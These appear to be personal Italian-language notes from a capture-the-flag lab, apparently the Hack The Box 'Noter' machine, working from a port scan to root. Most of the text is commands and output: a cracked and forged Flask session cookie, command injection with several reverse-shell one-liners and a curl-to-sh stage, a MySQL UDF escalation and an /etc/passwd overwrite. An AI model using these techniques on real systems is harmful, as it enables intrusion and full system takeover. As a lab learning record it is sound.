10.10.11.160



nmap -sC -sV -p 21,22,5000 -oA servicescan 10.10.11.160
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-06 05:51 EDT
Nmap scan report for 10.10.11.160
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds



porta 5000 sito web per rpednere Noter
possibile login e registrazione

werkzeug se configurato male espone la console:

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug


in questo caso non la espone

registro account

abc:password123


posso modificare le note a http://10.10.11.160:5000/edit_note/3 (il numero è progrssivo)

non si riesce a fare injection di javascript

&lt;p&gt;&amp;lt;script&amp;gt;alert(&amp;quot;HELLO&amp;quot;)&amp;

viene tutto parsed


posso provare a vedere con burpsuite come vengono passati i parametri (magari c'è XXE)



dalla sorgente pagina vedo che usa CKEDITOR.replace('editor')

CKEDITOR ha varie vulnerabilità


   <script src="//cdn.ckeditor.com/4.6.2/basic/ckeditor.js">


non riesco a sfruttarle, anche riuscendo non so quanto mi può essere utile un xss 


l'unica cosa che ho è il session cookie se si riesce ad utilizzare

visto che il server è werkzeug il backend è python quindi molto probabilmente usa flask

potrei provare ad usare:

https://github.com/mprunet/flask_util


python3 decode.py eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWJjIn0.Yp3YBA.MhyrYXO73oBPqntP2EYHJFnIefc
b'{"logged_in":true,"username":"abc"}'
2022-06-06 10:33:40+00:00
SHA1 HMAC: 321cab6173bbde804faa7b4fd846072459c879f7


potrei generarlo per altri utenti (non so se ce ne sono e i loro username)

in realà è molto probabile che ci sia  almeno un altro utente infatti le note crete con il mio sono state create con numero progressivo 3 e 4 
molto prrobabile che altro utente haa creato 1 e 2

devo crackare la secret key però per generare un nuovo cookie 

provo ad usare flsk-unisgn


flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWJjIn0.Yp3YBA.MhyrYXO73oBPqntP2EYHJFnIefc  --no-literal-eval
[*] Session decodes to: {'logged_in': True, 'username': 'abc'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'


ho fatto due script che generano tutti i cookie dato un file di usernames e uno che prova tutte le curl per un file contenente tutti i cookies


la pagina di login ha partial information disclosure infatti se sia pwd che user sono sbaglaiti dice invalid credentials invece se user è giusto e pwd sbagliata dice invalid login


ho trovato che l'utente corretto quindi è blue

genero il cookie per blue 

flask-unsign --sign --cookie '{"logged_in":True,"username":"blue"}' --secret 'secret123'
IntcImxvZ2dlZF9pblwiOnRydWUsXCJ1c2VybmFtZVwiOlwiYmx1ZVwifSI.Yp5d4Q.xAPE4zqiUQxHVUh8joIupMPDrII

usando burp riesco ad ottenere la pagina delle notes di blue 

curl:
curl -i -s -k -X $'GET' \
    -H $'Host: 10.10.11.160:5000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://10.10.11.160:5000/dashboard' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
    -b $'session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yp5eMw.uNgITf5pKc5Hh8rQ5N-L8otT_IU' \
    $'http://10.10.11.160:5000/notes'


<a href="note/1">Noter Premium Membership</a></li>
<li class="list-group-item"><a href="note/2">Before the weekend</a>


ci sono queste due note 
le prendo sempre usando burp


nella nota 1 dice le credenziali per accedere a ftp:


Your username is 'blue' and the password is 'blue@Noter!'.


blue:blue@Noter!



entro in ftp e trovo file pdf con policy delle pwd 

c'è:

Default user-password generated by the application is in the format of "username@site_name!" (This applies to all your applications)


visto che la nota di prima era stata scritta da ftp_admin potrei riuscire ad accedere ad ftp se ftp_admin ha lasciato la pwd di defautl con:

ftp_admin:ftp_admin@Noter!   



e infatti riesco ad accedere
ci sono due zip che sembrano backup dell'app Noter

per prima cosa si trovano le credenziali di mysql:

app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'DB_user'
app.config['MYSQL_PASSWORD'] = 'DB_password'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'


nell'altro file (1635803546):

# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'




attachment_dir = 'misc/attachments/'


tra i file all'interno della directory c'è anche export_note.html che prima non avevo trovato e non è linkato sul sito 

come endopoint c'è anche 
/import_note
/export_note_remote

in export_note_remote (e export_note_local) c'è:

command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
subprocess.run(command, shell=True, executable="/bin/bash")

se riesco a mettere un comando al posto di $'{r.text.strip()}' potrei riuscire a prendere reverse shell


forse non vedevo queste funzionalità perchè non ero VIP mentre blue dovrebbe esserlo 

devo provare a fare qualche injection

in funzione parseurl:

if not url.endswith('.md'):
            return False, "Invalid file type"


quindi il file deve essere di tipo .md


tra l'altro il comando viene formattato con una python f-String:

f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"

mettendo solo ; && | ecc non viene interpretato come un comando sepèarato ma come parte del text mentre aggiungendo anche ' iniziano ad esserci problemi

quindi devo mettere '' per raggirare la f-string e poi il ; per fare cmd injection


questo funziona in locale, devo solo fare in modo da prendere la reverse shell e mandarlo al server 

echo "prova' ; id'" > exploit.md





echo "prova' ; sh -i >& /dev/tcp/10.10.14.19/8080 0>&1'" > exploit.md




funziona quasi:



POST /export_note_remote HTTP/1.1
Host: 10.10.11.160:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
Origin: http://10.10.11.160:5000
Connection: close
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yp5eMw.uNgITf5pKc5Hh8rQ5N-L8otT_IU
Referer: http://10.10.11.160:5000/export_note_remote
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F10.10.14.19%2Fexploit.md



ricevo qualcosa ma si chiude

bash: cannot set terminal process group (1263): Inappropriate ioctl for device
bash: no job control in this shell
bash: 6303: No such file or directory


echo "prova' ; 0<&196;exec 196<>/dev/tcp/10.10.14.19/8081; sh <&196 >&196 2>&196'" > exploit.md



continua a non funzionare 

cerco di prendere shell con python (visto che il server è python c'è sicuramente)

il problema è che visto che per il comando python devo mettere gli apici singoli non posso metterlo direttamente nel comando iniziale quindi lo divido in due:


echo "prova' ; curl http://10.10.14.19/exploit_stage2.sh | sh'" > exploit_stage1.md

poi 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",8081));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

nel file exploit_stage2.sh



non funziona nemmeno cosi 


il problema era che nello scirpt python spawna una nuova shell che si chiude appena finisce il processo quindi all'istante la revshell si apriva e si chiudeva

con sleep si risolve:

echo "prova' ; sh -i 5<> /dev/tcp/10.10.14.19/8081 0<&5 1>&5 2>&5 ; sleep 50 '" > exploit_stage1.md


per farlo meglio e piu funzionale metto i processo in background usando & cosi non si chiude



echo "prova' ; sh -i 5<> /dev/tcp/10.10.14.19/8081 0<&5 1>&5 2>&5 & '" > exploit_stage1.md


curl completa:

curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.11.160:5000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 48' -H $'Origin: http://10.10.11.160:5000' -H $'Connection: close' -H $'Referer: http://10.10.11.160:5000/export_note_remote' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yp5eMw.uNgITf5pKc5Hh8rQ5N-L8otT_IU' \
    --data-binary $'url=http%3A%2F%2F10.10.14.19%2Fexploit_stage1.md' \
    $'http://10.10.11.160:5000/export_note_remote'






$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)

$ cat user.txt
643c995500e23b0cdd7cf83cb364a737





visto che ho le credenziali di mysql potrei provare con il db 




$ mysql --version
mysql --version
mysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
$ python3 -c 'import pty; pty.spawn("/bin/sh")'
$ mysql -u root -p        
mysql -u root -p
Enter password: Nildogg36



non ci sono info utili ma avendo le credenziali di mysql potrei puntare a eseguire qualche exploit su mysql (tipo macchina oscp)


$ dpkg -l | grep mysql
dpkg -l | grep mysql
ii  libdbd-mysql-perl:amd64              4.050-3                               amd64        Perl5 database interface to the MariaDB/MySQL database
ii  libmysqlclient21:amd64               8.0.27-0ubuntu0.20.04.1               amd64        MySQL database client library
ii  mysql-common                         5.8+1.0.5ubuntu2                      all          MySQL database common files, e.g. /etc/mysql/my.cnf





si può usare 

https://www.exploit-db.com/exploits/1518


c'è uno script per automatizzare:

https://gist.github.com/kazkansouh/3476a8c8846472da06f980494ac2c457


cerco di ottenere info su come compilare


MariaDB [(none)]> select @@version_compile_os, @@version_compile_machine;
select @@version_compile_os, @@version_compile_machine;
+----------------------+---------------------------+
| @@version_compile_os | @@version_compile_machine |
+----------------------+---------------------------+
| debian-linux-gnu     | x86_64                    |
+----------------------+---------------------------+
1 row in set (0.000 sec)


MariaDB [(none)]> show variables like '%compile%';
show variables like '%compile%';
+-------------------------+------------------+
| Variable_name           | Value            |
+-------------------------+------------------+
| version_compile_machine | x86_64           |
| version_compile_os      | debian-linux-gnu |
+-------------------------+------------------+
2 rows in set (0.001 sec)


MariaDB [(none)]> select @@plugin_dir ;
select @@plugin_dir ;
+---------------------------------------------+
| @@plugin_dir                                |
+---------------------------------------------+
| /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+---------------------------------------------+
1 row in set (0.000 sec)

non ho permessi per scrivere sotto questa dir 
provo a metetre sotto /tmp/plugin-dir

./mysql-udf-build.sh 64 linux /tmp/plugin-dir



mysql -u root -pNildogg36 mysql < lib_mysqludf_sys_linux_64.sql

mysql --plugin-dir /tmp/plugin-dir2 -u root -pNildogg36 mysql < lib_mysqludf_sys_linux_64.sql



non funziona, non trova il .so quando lo cerca anche se a crearlo lo crea correttamente

devo individuare la directory cporretta



+---------------------------+---------------------------------------------+
| Variable_name             | Value                                       |
+---------------------------+---------------------------------------------+
| aria_sync_log_dir         | NEWFILE                                     |
| basedir                   | /usr                                        |
| character_sets_dir        | /usr/share/mysql/charsets/                  |
| datadir                   | /var/lib/mysql/                             |
| innodb_data_home_dir      |                                             |
| innodb_log_group_home_dir | ./                                          |
| innodb_tmpdir             |                                             |
| lc_messages_dir           | /usr/share/mysql                            |
| plugin_dir                | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| slave_load_tmpdir         | /tmp                                        |
| tmpdir                    | /tmp                                        |
| wsrep_data_home_dir       | /var/lib/mysql/                             |
+---------------------------+---------------------------------------------+



dalla documentazione di mariadb:


The shared library must be located in the plugin directory (that is, the directory named by the plugin_dir system variable). 
The library must be in the plugin directory itself, not in a subdirectory

quindi in teoria dovrebbe stare sotto:

plugin_dir           /usr/lib/x86_64-linux-gnu/mariadb19/plugin/


./mysql-udf-build.sh 64 linux  /usr/lib/x86_64-linux-gnu/mariadb19/plugin/

//AGGIUNGERE CODICE PER REVERSE SHELL ALLA FINE DEL FILE .SQL ALTRIMENTI CARICA SOLO IL .SO MA NON FA NIENTE

mysql -u root -pNildogg36 mysql < lib_mysqludf_sys_linux_64.sql


la reverse shell non mi funziona per qualche mativo provo a cambiare i permessi del file /etc/passwd cosi lo sovrascrivo e prendo root piu velocemente 

(poi devo resettare la macchina cosi non la lascio rotta)


$ mysql -u root -pNildogg36 mysql < lib_mysqludf_sys_linux_64.sql
mysql -u root -pNildogg36 mysql < lib_mysqludf_sys_linux_64.sql
sys_exec('chmod 777 /etc/passwd')
0


$ echo root::0:0:root:/root:/bin/bash > /etc/passwd
echo root::0:0:root:/root:/bin/bash > /etc/passwd
$ su
su
root@noter:/tmp/plugin# id
id
uid=0(root) gid=0(root) groups=0(root)
root@noter:/tmp/plugin# cat /root/root.txt
cat /root/root.txt
ee7b0ce0fce3ee7a7e63b5694c91b777
root@noter:/tmp/plugin# 


